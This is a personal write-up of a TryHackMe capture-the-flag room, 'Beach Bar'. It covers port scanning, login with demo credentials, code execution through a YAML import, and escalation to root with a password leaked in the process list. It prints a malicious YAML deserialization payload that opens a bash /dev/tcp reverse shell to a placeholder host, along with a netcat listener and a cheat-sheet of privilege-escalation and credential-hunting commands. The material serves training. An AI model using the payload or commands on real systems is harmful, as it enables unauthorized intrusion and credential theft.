---
icon: user-hoodie
---

# Beach Bar

**Date:** 2026-10-24\
**Profile:** skrumf\
**Platform:** TryHackMe\
**Room URL:** [Link to Room](https://tryhackme.com/room/hh-beachbar-d849f7f7)\
**Difficulty:** Easy\
**Machine:** Linux\
**Tags:** Room

***

## Framework - MITRE ATT&CK

* ✅ Reconnaissance\
  An nmap scan showed SSH and HTTP open on the standard ports. The login page on port 80 had demo credentials (dj / dj) sitting in the page source.
* ✅ Initial Access\
  Logged in with the demo credentials.
* ✅ Execution\
  Abused a YAML import feature to get a reverse shell.
* ✅ Persistence\
  Upgraded to a stable TTY shell.
* ✅ Lateral Movement\
  A service running as root turned out to hold root's password in plain text.
* ✅ Privilege Escalation\
  Reused that password with su to become root.
* ✅ Actions on Objectives\
  Read root.txt in /root.

***

## Reconnaissance

I started with an nmap scan to find open ports and got back port 22 (SSH) and port 80 (HTTP). I opened the site on port 80 in the browser and, digging through the page source, found a set of demo credentials.

## Initial Access

I logged in with those demo credentials — username `dj`, password `dj`. Once inside, I found a feature that let me import a YAML file, which looked like a promising way to get code execution.

## Privilege Escalation

First I started a listener on my attack box:

```bash
nc -lvnp 4444
```

Then I built a malicious YAML file that abuses unsafe deserialization to fire a reverse shell back to that listener:

```yaml
!!python/object/apply:os.system
  - "bash -c 'bash -i >& /dev/tcp/HostIP/4444 0>&1'"
```

Importing it gave me a shell, which I upgraded to a proper TTY so I could work comfortably and read the user flag. From there I went looking for a way to escalate, and found a service running as root with its password stored in plain text. I reused that password to become root and read root.txt.

## Actions on Objectives

With root access I could read root.txt in /root.

## Tools Used

* nmap
* cat
* nc
* python3
* bash
* yaml
* sudo
* ls
* find
* ps
* grep

## Lessons Learned

### The path

Foothold as `bartender` (user flag) → enumerated for privesc → found a root-owned service leaking its password on the command line → reused that password to become root.

### Key lessons

**1. User → root on one box is *privilege escalation*, not lateral movement.**
Lateral movement = hopping to a different host/account at the same level. Vertical = climbing privilege on the same host. Getting the terms right tells you which enumeration to run.

**2. Enumerate in order; rule out whole categories.**

* `find / -perm -4000 -type f 2>/dev/null` → all standard Ubuntu SUID binaries + snap noise. **SUID ruled out** — a real finding, not a dead end.
* Ignore `/snap/...` (read-only squashfs) and `venv/site-packages/` (third-party library code) in results. Signal lives in the app's own paths.

**3. A non-interactive shell ≠ "no sudo access."**
`sudo: a terminal is required to read the password` means a dumb shell, not a locked account. Upgrade the TTY first:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z → stty raw -echo; fg → export TERM=xterm
```

**4. A password wall on an easy box = "find it," not "guess it."**
Look in the app's own files, not library code. Filter grep hits by **path** — `webapp/`, `jukeboxd/`, not `venv/`.

**5. ⭐ `ps aux` is the MVP for leaked credentials.**
The win came from:

```
root  611  ...  jukeboxd.py --stream-pass SunsetSpritz2024! --bitrate 320k
```

`/proc/<pid>/cmdline` is world-readable, so **any** user can read the full launch command of **every** process — including root's. Secrets passed as CLI args (`--password`, `--token`, `--stream-pass`) leak to everyone. This is a real-world misconfig, not just a CTF trick.

**6. Credential reuse is the first thing to try once you have a password.**
One password on the box → try it everywhere, starting with `su root`.

### Tool cheat-sheet

| Goal | Command |
|---|---|
| SUID hunt | `find / -perm -4000 -type f 2>/dev/null` |
| Sudo rights | `sudo -l` |
| **Leaked creds in processes** | `ps aux` / `ps -ef` |
| How a service starts & as whom | `cat /etc/systemd/system/*.service`, `ps aux` |
| Cron jobs | `cat /etc/crontab`, `ls -la /etc/cron.*` |
| Secrets in app files | `grep -riE "password\|secret" /opt /var/www 2>/dev/null` |

### The habit to keep

Each result either *points somewhere* or *rules something out* — both move you forward. Read output to understand **why** it's exploitable, rather than pasting the first thing that looks promising.
